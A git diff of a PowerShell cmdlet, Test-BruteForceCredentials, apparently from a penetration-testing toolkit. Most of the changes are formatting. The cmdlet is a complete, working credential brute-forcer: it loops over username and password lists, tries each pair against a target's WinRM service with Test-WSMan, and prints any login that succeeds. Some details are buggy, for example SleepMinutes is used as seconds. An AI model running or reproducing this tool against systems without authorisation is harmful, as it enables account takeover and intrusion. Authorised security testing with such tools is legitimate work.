@@ -1,3 +1,4 @@
+Function Test-BruteForceCredentials {
 <#
 .SYNOPSIS
 This cmdlet was created to brute force credentials using WinRM
@@ -50,8 +51,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -65,9 +68,7 @@ System.String, System,Array
 
 .OUTPUTS
 PSCustomObject
-
 #>
-Function Test-BruteForceCredentials {
     [CmdletBinding()]
         param(
             [Parameter(
@@ -115,22 +116,18 @@ Function Test-BruteForceCredentials {
             [String]$PassFile)  # End param
 
 
-    If ($PSBoundParameters.Keys -eq 'Username')
-    {
+    If ($PSBoundParameters.Keys -eq 'Username') {
 
-        Write-Verbose "Username ParameterSet being used"
+        Write-Verbose -Message "Username ParameterSet being used"
 
-        [array]$UserList = $Username
+        [Array]$UserList = $Username
 
-    }  # End If
-    ElseIf ($PSBoundParameters.Keys -eq 'UserFile')
-    {
+    } ElseIf ($PSBoundParameters.Keys -eq 'UserFile') {
 
-        Write-Verbose "UserFile ParameterSet being used"
+        Write-Verbose -Message "UserFile ParameterSet being used"
 
         $UserList = Get-Content -Path $UserFile
-        ForEach ($User in $UserList)
-        {
+        ForEach ($User in $UserList) {
 
             $UserList += $User
 
@@ -140,22 +137,16 @@ Function Test-BruteForceCredentials {
     }  # End ElseIf
 
 
-    If ($PSBoundParameters.Keys -eq 'Passwd')
-    {
+    If ($PSBoundParameters.Keys -eq 'Passwd') {
 
-        Write-Verbose "Passwd ParameterSet being used"
+        Write-Verbose -Message "Passwd ParameterSet being used"
+        [Array]$PassList = $Passwd
 
-        [array]$PassList = $Passwd
+    } ElseIf ($PSBoundParameters.Keys -eq 'PassFile') {
 
-    }  # End Password Switch
-    ElseIf ($PSBoundParameters.Keys -eq 'PassFile')
-    {
-
-        Write-Verbose "PassFile ParameterSet being used"
-
+        Write-Verbose -Message "PassFile ParameterSet being used"
         $PassList = Get-Content -Path $PassFile
-        ForEach ($P in $PassList)
-        {
+        ForEach ($P in $PassList) {
 
             $Passwd += $P
 
@@ -164,84 +155,65 @@ Function Test-BruteForceCredentials {
 
     }  # End ElseIf
 
-    ForEach ($U in $UserList)
-    {
+    ForEach ($U in $UserList) {
 
-        Write-Verbose "Testing passwords for $U"
+        Write-Verbose -Message "Testing passwords for $U"
 
-        ForEach ($P in $PassList)
-        {
+        ForEach ($P in $PassList) {
 
             $Error.Clear()
-
             $Credentials = @()
-
             $SecurePassword = ConvertTo-SecureString -String $P -AsPlainText -Force
             $AttemptCredentials = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecurePassword)
 
-            If ($UseSSL.IsPresent)
-            {
+            If ($UseSSL.IsPresent) {
 
-                If ($PSBoundParameters.Keys -eq "SleepSeconds")
-                {
+                If ($PSBoundParameters.Keys -eq "SleepSeconds") {
 
                     Start-Sleep -Seconds $SleepSeconds
 
-                }  # End If
-                ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
-                {
+                } ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes") {
 
                     Start-Sleep -Seconds $SleepMinutes
 
-                }  # End ElseIf
+                }  # End If ElseIf
 
                 $Result = Test-WSMan -UseSSL -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
 
-            }  # End If
-            Else
-            {
+            } Else {
 
-                If ($PSBoundParameters.Keys -eq "SleepSeconds")
-                {
+                If ($PSBoundParameters.Keys -eq "SleepSeconds") {
 
                     Start-Sleep -Seconds $SleepSeconds
 
-                }  # End If
-                ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
-                {
+                } ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes") {
 
                     Start-Sleep -Seconds $SleepMinutes
 
-                }  # End ElseIf
+                }  # End If ElseIf
 
                 $Result = Test-WSMan -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
 
-            }  # End Else
+            }  # End If Else
 
-           If ($Null -eq $Result)
-           {
+           If ($Null -eq $Result) {
 
-                Write-Verbose "[*] Testing Password: $P = Failed"
+                Write-Verbose -Message "[*] Testing Password: $P = Failed"
 
-            }  # End If
-            Else
-            {
-
+            } Else {
 
                 $Credentials += "USER: $U`nPASS: $P`n"
+                Write-Output -InputObject "SUCCESS: `n$Credentials`n"
 
-                Write-Output "SUCCESS: `n$Credentials`n"
+            }  # End If Else
 
-            }  # End Else
-
-        } # ForEach
+        }  # End ForEach
 
     }  # End ForEach
 
-    If ($Null -eq $Credentials)
-    {
+    If ($Null -eq $Credentials) {
 
-        Write-Output "FAILED: None of the defined passwords were found to be correct"
+        Write-Output -InputObject "FAILED: None of the defined passwords were found to be correct"
 
     }  # End Else
 
